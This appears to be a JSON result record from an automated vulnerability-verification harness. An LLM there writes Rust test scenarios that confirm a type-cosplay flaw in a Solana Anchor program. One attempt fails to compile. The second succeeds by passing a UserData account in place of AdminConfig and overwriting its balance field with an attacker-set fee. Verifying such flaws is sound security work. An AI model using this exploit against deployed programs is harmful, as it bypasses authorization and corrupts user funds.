@@ -1,0 +1,89 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e efeitos verificados: UserData teve o campo balance (offset 40) sobrescrito com o novo fee",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2030,
+        "completion_tokens": 718,
+        "latency_s": 4.09
+      },
+      "raw": "{\n  \"plan\": \"Preparamos uma conta UserData cujo campo authority (bytes 8..40) é a pubkey do atacante, e uma conta AdminConfig legítima cujo admin é uma pubkey diferente. O baseline chama update_fee com a AdminConfig legítima e o admin correto, provando que o cenário está montado. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig, com o atacante como signer. O efeito mede se os bytes 40..48 da UserData foram sobrescritos com o novo fee, demonstrando que uma conta de outro tipo foi aceita.\",\n  \"scenario\": \"let attacker = Pubkey::new_unique();\\nlet legit_admin = Pubkey::new_unique();\\n\\nlet config_key = Pubkey::new_unique();\\nlet user_key = Pubkey::new_unique();\\n\\nlet config_data = anchor_account_data(\\\"AdminConfig\\\", &[legit_admin.to_bytes().to_vec(), 100u64.to_le_bytes().to_vec()]);\\nlet user_data = anchor_account_data(\\\"UserData\\\", &[attacker.to_bytes().to_vec(), 0u64.to_le_bytes().to_vec()]);\\n\\nlet config_account = account(&env.program_id, &config_data, None);\\nlet user_account = account(&env.program_id, &user_data, None);\\nlet attacker_wallet = wallet(1_000_000_000);\\nlet legit_wallet = wallet(1_000_000_000);\\n\\nlet metas_legit = vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(legit_admin, true),\\n];\\nlet ix_legit = env.anchor_ix(\\\"update_fee\\\", &(500u64,), metas_legit);\\nlet contas_legit = vec![\\n    (config_key, config_account.clone()),\\n    (legit_admin, legit_wallet.clone()),\\n];\\nlet r_base = env.baseline(\\\"update_fee legitimo com AdminConfig e admin correto\\\", &ix_legit, &contas_legit);\\n\\nlet metas_attack = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n];\\nlet ix_attack = env.anchor_ix(\\\"update_fee\\\", &(999u64,), metas_attack);\\nlet contas_attack = vec![\\n    (user_key, user_account.clone()),\\n    (attacker, attacker_wallet.clone()),\\n];\\nlet r = env.attack(\\\"update_fee passando UserData no lugar de AdminConfig\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let user_after = after(&r, &user_key);\\n    let fee_after = read_u64(user_after.data(), 40);\\n    env.effect(\\\"UserData teve o campo balance (offset 40) sobrescrito com o novo fee\\\", fee_after == 999u64);\\n}\"\n}",
+      "plan": "Preparamos uma conta UserData cujo campo authority (bytes 8..40) é a pubkey do atacante, e uma conta AdminConfig legítima cujo admin é uma pubkey diferente. O baseline chama update_fee com a AdminConfig legítima e o admin correto, provando que o cenário está montado. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig, com o atacante como signer. O efeito mede se os bytes 40..48 da UserData foram sobrescritos com o novo fee, demonstrando que uma conta de outro tipo foi aceita.",
+      "scenario": "let attacker = Pubkey::new_unique();\nlet legit_admin = Pubkey::new_unique();\n\nlet config_key = Pubkey::new_unique();\nlet user_key = Pubkey::new_unique();\n\nlet config_data = anchor_account_data(\"AdminConfig\", &[legit_admin.to_bytes().to_vec(), 100u64.to_le_bytes().to_vec()]);\nlet user_data = anchor_account_data(\"UserData\", &[attacker.to_bytes().to_vec(), 0u64.to_le_bytes().to_vec()]);\n\nlet config_account = account(&env.program_id, &config_data, None);\nlet user_account = account(&env.program_id, &user_data, None);\nlet attacker_wallet = wallet(1_000_000_000);\nlet legit_wallet = wallet(1_000_000_000);\n\nlet metas_legit = vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(legit_admin, true),\n];\nlet ix_legit = env.anchor_ix(\"update_fee\", &(500u64,), metas_legit);\nlet contas_legit = vec![\n    (config_key, config_account.clone()),\n    (legit_admin, legit_wallet.clone()),\n];\nlet r_base = env.baseline(\"update_fee legitimo com AdminConfig e admin correto\", &ix_legit, &contas_legit);\n\nlet metas_attack = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(attacker, true),\n];\nlet ix_attack = env.anchor_ix(\"update_fee\", &(999u64,), metas_attack);\nlet contas_attack = vec![\n    (user_key, user_account.clone()),\n    (attacker, attacker_wallet.clone()),\n];\nlet r = env.attack(\"update_fee passando UserData no lugar de AdminConfig\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let user_after = after(&r, &user_key);\n    let fee_after = read_u64(user_after.data(), 40);\n    env.effect(\"UserData teve o campo balance (offset 40) sobrescrito com o novo fee\", fee_after == 999u64);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n  --> tests/attempt.rs:15:60\n   |\n15 | ...dminConfig\", &[legit_admin.to_bytes().to_vec(), 100u64.to_le_bytes(...\n   |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `Vec<u8>`\n   |\n   = note: expected type `u8`\n            found struct `Vec<u8>`\n\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:16:55\n   |\n16 | ..., &[attacker.to_bytes().to_vec(), 0u64.to_le_bytes().to_vec()]);\n   |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `Vec<u8>`\n   |\n   = note: expected type `u8`\n            found struct `Vec<u8>`\n\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:27:48\n   |\n27 |     let ix_legit = env.anchor_ix(\"update_fee\", &(500u64,), metas_legit);\n   |                        ---------               ^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |                        |\n   |                        arguments to this method are incorrect\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\n  --> src/lib.rs:98:12\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:38:49\n   |\n38 | ...attack = env.anchor_ix(\"update_fee\", &(999u64,), metas_attack);\n   |                 ---------               ^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |                 |\n   |                 arguments to this method are incorrect\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:15:60\n   |\n15 | ...dminConfig\", &[legit_admin.to_bytes().to_vec(), 100u64.to_le_bytes(...\n   |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `Vec<u8>`\n   |\n   = note: expected type `u8`\n            found struct `Vec<u8>`\n\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:16:55\n   |\n16 | ..., &[attacker.to_bytes().to_vec(), 0u64.to_le_bytes().to_vec()]);\n   |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `Vec<u8>`\n   |\n   = note: expected type `u8`\n            found struct `Vec<u8>`\n\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:27:48\n   |\n27 |     let ix_legit = env.anchor_ix(\"update_fee\", &(500u64,), metas_legit);\n   |                        ---------               ^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |                        |\n   |                        arguments to this method are incorrect\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\n  --> src/lib.rs:98:12\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:38:49\n   |\n38 | ...attack = env.anchor_ix(\"update_fee\", &(999u64,), metas_attack);\n   |                 ---------               ^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |                 |\n   |                 arguments to this method are incorrect\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3017,
+        "completion_tokens": 753,
+        "latency_s": 3.62
+      },
+      "raw": "{\"plan\": \"Preparo uma conta AdminConfig legítima (admin = legit_admin) e uma conta UserData cujo campo authority (offset 8..40) é a pubkey do atacante. O baseline chama update_fee com a AdminConfig e o signer legítimo, provando que o cenário está montado. O ataque chama update_fee passando a UserData no lugar da AdminConfig, assinada pelo atacante, para que a leitura manual dos bytes 8..40 coincida com o signer. O efeito mede se o campo balance da UserData (offset 40) foi sobrescrito com o novo fee, demonstrando o COSPLAY.\", \"scenario\": \"let attacker = Pubkey::new_unique();\\nlet legit_admin = Pubkey::new_unique();\\n\\nlet config_key = Pubkey::new_unique();\\nlet user_key = Pubkey::new_unique();\\n\\nlet mut config_data = anchor_account_data(\\\"AdminConfig\\\", &[]);\\nconfig_data.extend_from_slice(legit_admin.as_ref());\\nconfig_data.extend_from_slice(&100u64.to_le_bytes());\\n\\nlet mut user_data = anchor_account_data(\\\"UserData\\\", &[]);\\nuser_data.extend_from_slice(attacker.as_ref());\\nuser_data.extend_from_slice(&0u64.to_le_bytes());\\n\\nlet config_account = account(&env.program_id, &config_data, None);\\nlet user_account = account(&env.program_id, &user_data, None);\\nlet attacker_wallet = wallet(1_000_000_000);\\nlet legit_wallet = wallet(1_000_000_000);\\n\\nlet metas_legit = vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(legit_admin, true),\\n];\\nlet ix_legit = env.anchor_ix(\\\"update_fee\\\", &500u64.to_le_bytes(), metas_legit);\\nlet contas_legit = vec![\\n    (config_key, config_account.clone()),\\n    (legit_admin, legit_wallet.clone()),\\n];\\nlet _r_base = env.baseline(\\\"update_fee legitimo com AdminConfig e admin correto\\\", &ix_legit, &contas_legit);\\n\\nlet metas_attack = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n];\\nlet ix_attack = env.anchor_ix(\\\"update_fee\\\", &999u64.to_le_bytes(), metas_attack);\\nlet contas_attack = vec![\\n    (user_key, user_account.clone()),\\n    (attacker, attacker_wallet.clone()),\\n];\\nlet r = env.attack(\\\"update_fee passando UserData no lugar de AdminConfig\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let user_after = after(&r, &user_key);\\n    let fee_after = read_u64(user_after.data(), 40);\\n    env.effect(\\\"UserData teve o campo balance (offset 40) sobrescrito com o novo fee\\\", fee_after == 999u64);\\n}\"}",
+      "plan": "Preparo uma conta AdminConfig legítima (admin = legit_admin) e uma conta UserData cujo campo authority (offset 8..40) é a pubkey do atacante. O baseline chama update_fee com a AdminConfig e o signer legítimo, provando que o cenário está montado. O ataque chama update_fee passando a UserData no lugar da AdminConfig, assinada pelo atacante, para que a leitura manual dos bytes 8..40 coincida com o signer. O efeito mede se o campo balance da UserData (offset 40) foi sobrescrito com o novo fee, demonstrando o COSPLAY.",
+      "scenario": "let attacker = Pubkey::new_unique();\nlet legit_admin = Pubkey::new_unique();\n\nlet config_key = Pubkey::new_unique();\nlet user_key = Pubkey::new_unique();\n\nlet mut config_data = anchor_account_data(\"AdminConfig\", &[]);\nconfig_data.extend_from_slice(legit_admin.as_ref());\nconfig_data.extend_from_slice(&100u64.to_le_bytes());\n\nlet mut user_data = anchor_account_data(\"UserData\", &[]);\nuser_data.extend_from_slice(attacker.as_ref());\nuser_data.extend_from_slice(&0u64.to_le_bytes());\n\nlet config_account = account(&env.program_id, &config_data, None);\nlet user_account = account(&env.program_id, &user_data, None);\nlet attacker_wallet = wallet(1_000_000_000);\nlet legit_wallet = wallet(1_000_000_000);\n\nlet metas_legit = vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(legit_admin, true),\n];\nlet ix_legit = env.anchor_ix(\"update_fee\", &500u64.to_le_bytes(), metas_legit);\nlet contas_legit = vec![\n    (config_key, config_account.clone()),\n    (legit_admin, legit_wallet.clone()),\n];\nlet _r_base = env.baseline(\"update_fee legitimo com AdminConfig e admin correto\", &ix_legit, &contas_legit);\n\nlet metas_attack = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(attacker, true),\n];\nlet ix_attack = env.anchor_ix(\"update_fee\", &999u64.to_le_bytes(), metas_attack);\nlet contas_attack = vec![\n    (user_key, user_account.clone()),\n    (attacker, attacker_wallet.clone()),\n];\nlet r = env.attack(\"update_fee passando UserData no lugar de AdminConfig\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let user_after = after(&r, &user_key);\n    let fee_after = read_u64(user_after.data(), 40);\n    env.effect(\"UserData teve o campo balance (offset 40) sobrescrito com o novo fee\", fee_after == 999u64);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legitimo com AdminConfig e admin correto",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "attack",
+            "note": "update_fee passando UserData no lugar de AdminConfig",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "effect",
+            "note": "UserData teve o campo balance (offset 40) sobrescrito com o novo fee",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e efeitos verificados: UserData teve o campo balance (offset 40) sobrescrito com o novo fee"
+    }
+  ],
+  "case_id": "SSP-06-A-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "high",
+    "evidence": "let data = ctx.accounts.config.try_borrow_data()?;\nlet admin_bytes: [u8; 32] = data[8..40].try_into()...",
+    "explanation": "Os dados da conta sao desserializados manualmente a partir de `UncheckedAccount` sem validar o discriminador de 8 bytes do Anchor. O codigo assume que os bytes 8..40 sao o campo `admin` de `AdminConfig`, mas qualquer conta com layout compativel (por exemplo `UserData`, cujo campo `authority` tambem ocupa 8..40) pode ser passada.",
+    "attack_hypothesis": "Um atacante passa uma conta `UserData` (ou qualquer conta com 8 bytes de discriminador seguidos de uma pubkey controlada) no lugar de `AdminConfig`. O codigo le os bytes 8..40 como se fossem o admin, e se essa pubkey for a do atacante, a verificacao passa e o campo de fee e sobrescrito indevidamente."
+  }
+}
